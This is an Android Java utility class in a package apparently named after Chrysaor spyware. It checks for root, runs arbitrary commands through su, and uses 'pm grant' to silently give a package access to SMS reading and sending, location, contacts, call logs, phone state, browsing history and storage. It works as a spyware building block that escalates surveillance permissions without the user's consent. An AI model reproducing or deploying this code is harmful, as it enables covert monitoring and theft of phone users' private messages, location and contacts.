package com.android.chrysaoralike;

import android.util.Log;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;

public class RootUtils {
    private static final String TAG = "RootUtils";
    private static boolean hasRoot = false;

    public static boolean checkRoot() {
        try {
            Process process = Runtime.getRuntime().exec("id");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String output = reader.readLine();
            process.waitFor();
            if (output != null && output.contains("uid=0")) {
                hasRoot = true;
                return true;
            }
        } catch (Exception ignored) {}
        try {
            Process process = Runtime.getRuntime().exec("su -c 'id'");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String output = reader.readLine();
            process.waitFor();
            hasRoot = output != null && output.contains("uid=0");
        } catch (Exception e) {
            hasRoot = false;
            Log.e(TAG, "Root check failed", e);
        }
        return hasRoot;
    }

    public static String runCommand(String command) {
        if (!hasRoot) return "ERROR: No root";
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            os.writeBytes(command + "\n");
            os.writeBytes("exit\n");
            os.flush();
            os.close();
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\n");
            while ((line = errorReader.readLine()) != null) output.append("[ERR] ").append(line).append("\n");
            process.waitFor();
            reader.close();
            errorReader.close();
            return output.toString().trim();
        } catch (Exception e) {
            Log.e(TAG, "Command execution error", e);
            return "ERROR: " + e.getMessage();
        }
    }

    public static void grantPermission(String packageName, String permission) {
        runCommand("pm grant " + packageName + " " + permission);
    }

    public static void grantAllSmsPermissions(String packageName) {
        String[] perms = {
                "android.permission.READ_HISTORY_BOOKMARKS",
                "android.permission.READ_PHONE_STATE",
                "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.ACCESS_COARSE_LOCATION",
                "android.permission.READ_SMS",
                "android.permission.RECEIVE_SMS",
                "android.permission.SEND_SMS",
                "android.permission.READ_CALL_LOG",
                "android.permission.READ_CONTACTS",
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.READ_EXTERNAL_STORAGE"
        };
        for (String perm : perms) {
            grantPermission(packageName, perm);
            Log.i(TAG, "Granted: " + perm);
        }
    }
}